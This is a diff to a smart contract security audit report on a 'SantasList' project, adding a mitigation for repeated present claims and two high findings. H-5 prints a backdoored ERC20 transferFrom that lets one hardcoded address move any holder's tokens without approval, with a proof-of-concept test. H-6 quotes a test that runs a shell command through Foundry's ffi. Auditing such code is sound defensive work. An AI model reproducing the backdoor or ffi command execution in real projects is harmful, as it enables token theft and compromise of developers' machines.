@@ -160,6 +160,133 @@ function testNICEorEXTRA_NICECanClaimPresentMultipleTimes() public{
     }
 ```
 
-**Recomended Mitigation:** Add the below check to 
+**Recomended Mitigation:** Add the below code to mitigate the issue. SantasList should maintain a mapping to keep track of addresses which already collected present through `SantasList::collectPresent` Function. 
+
+```solidity
+mapping(address user => bool) private hasClaimed;
+```
+Now, modify the collectPresent Function as Follows:
+
+```solidity
+    function collectPresent() external {
+        require(!hasClaimed[msg.sender], "user already collected present");
+
+        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
+            revert SantasList__NotChristmasYet();
+        }
+
+        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
+            _mintAndIncrement();
+            hasClaimed[msg.sender] = true;
+            return;
+        } else if (
+            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
+                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
+        ) {
+            _mintAndIncrement();
+            i_santaToken.mint(msg.sender);
+            hasClaimed[msg.sender] = true;
+
+            return;
+        }
+        revert SantasList__NotNice();
+    }
+```
+
+### [H-5] Forked ERC20 solmate contract is used which is vulnerable to malicious code injection inside `transferFrom` function and is inherited in `SantaToken`
+
+**Description:** 
+
+A malicious code is detected in a modified version of the Solmate ERC20 contract inside the `transferFrom` function. The library was forked from the Solmate repository and has been modified to include the malicious code. The `SantaToken` contract inherits this malicious ERC20 contract which brings all the risks inside the SantaToken contract that are associated with the modified ERC20 contract.
 
 
+```solidity
+function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
+@>  // hehehe :)
+@>  // https://arbiscan.io/tx/0xd0c8688c3bcabd0024c7a52dfd818f8eb656e9e8763d0177237d5beb70a0768d
+@>  if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
+@>      balanceOf[from] -= amount;
+@>      unchecked {
+@>          balanceOf[to] += amount;
+@>      }
+@>      emit Transfer(from, to, amount);
+@>      return true;
+@>  }
+
+    uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.
+
+    if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
+
+    balanceOf[from] -= amount;
+
+    // Cannot overflow because the sum of all user
+    // balances can't exceed the max uint256 value.
+    unchecked {
+        balanceOf[to] += amount;
+    }
+
+    emit Transfer(from, to, amount);
+
+    return true;
+}
+```
+
+**Impact:**
+This allows the attacker having the address `0x815F577F1c1bcE213c012f166744937C889DAF17` to transfer tokens from one address to another address, without requiring approval from the `from` address to attacker's address. This can lead to significant financial loss for token holders and can undermine the trust in the SantaToken.
+
+**Proof Of Concept:** 
+
+```solidity
+function testMalicousAddressCanTransferTokens(){
+    address maliciousActor = 0x815F577F1c1bcE213c012f166744937C889DAF17;
+    vm.startPrank(santa);
+    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
+    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
+    vm.stopPrank();
+
+    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 
+
+    vm.prank(user);
+    santasList.collectPresent();
+    // After this the user will have the Santa Tokens
+
+    uint256 userBalance = santaToken.balanceOf(user);
+    assertEq(userBalance, 1e18);
+
+    vm.prank(maliciousActor);
+    bool success = santaToken.transferFrom(user, maliciousActor, userBalance);
+
+    assert(success == true);
+    assertEq(santaToken.balanceOf(user), 0);
+    assertEq(santaToken.balanceOf(maliciousActor), userBalance);
+}
+
+```
+
+**Recomended Mitigation:**
+* Use the ERC20 contract from the official Solmate's library.
+* Delete the malicious forked solmate library from the `lib` folder and use the official safe one.
+* Refactor the library installs in every place.
+
+### [H-6] Test Suite contains a malicious test allowing data extraction from the user running it 
+
+**Description:**
+This testPwned function allows to execute arbitrary commands. If the test suite is run in an environment where ffi is allowed, malicious commands could be executed, potentially causing harm to the environment, such as deleting files or leaking sensitive information. The below is the malcious test it creates a file named as `youve-been-pwned` but there is no reason to keep this test here.
+
+```solidity
+function testPwned() public {
+        string[] memory cmds = new string[](2);
+        cmds[0] = "touch";
+        cmds[1] = string.concat("youve-been-pwned");
+        cheatCodes.ffi(cmds);
+    }
+```
+
+**Impact:**
+
+This issue is considered high because it presents a significant risk of sensitive information being leaked or malicious commands being executed.
+
+**Recommended Mitigation:**
+
+* Remove the test from the test suite
+* Always used 3rd party programs on the system with caution.
